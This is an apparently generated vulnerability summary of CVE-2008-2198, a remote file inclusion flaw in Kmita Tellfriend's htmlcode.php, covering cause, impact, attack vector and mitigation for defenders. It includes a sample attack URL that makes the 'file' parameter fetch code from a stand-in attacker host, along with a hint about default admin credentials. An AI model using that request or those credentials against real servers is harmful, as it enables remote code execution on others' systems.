Based on the provided content, here's a breakdown of the vulnerability:

**CVE ID:** CVE-2008-2198

**Root Cause of Vulnerability:**
- The `file` parameter in `htmlcode.php` is not properly sanitized before being used in an include function.

**Weaknesses/Vulnerabilities Present:**
- **Remote File Inclusion (RFI):** The vulnerability allows an attacker to include arbitrary files from local or external resources. This is due to the lack of proper input validation on the `file` parameter.

**Impact of Exploitation:**
- **System access:** Successful exploitation could lead to complete system access by executing malicious code through the included file.

**Attack Vectors:**
- **HTTP GET Request:** The vulnerability is triggered through a crafted HTTP GET request to `htmlcode.php` with a malicious URL in the `file` parameter.

**Required Attacker Capabilities/Position:**
- **Network Access:** The attacker needs to be able to send HTTP requests to the vulnerable server.
- **`register_globals` Enabled:** The vulnerability is more easily exploited if the PHP setting `register_globals` is enabled on the server.

**Technical Details:**
- The vulnerable parameter is `file` in `htmlcode.php`
- A sample malicious request is provided: `http://www.target.com/kmitaadmin/kmitat/htmlcode.php?file=http://attacker.com/evil?`
- Default user/pass for login is mentioned as admin, which can be used in order to perform the attack if login is required
- The application affected is Kmita Tellfriend <= 2.0
-  The advisory was released on 2008-05-05

**Mitigation:**
- Input sanitization should be performed before including a file based on the `file` parameter
- Disable `register_globals` in `php.ini`.
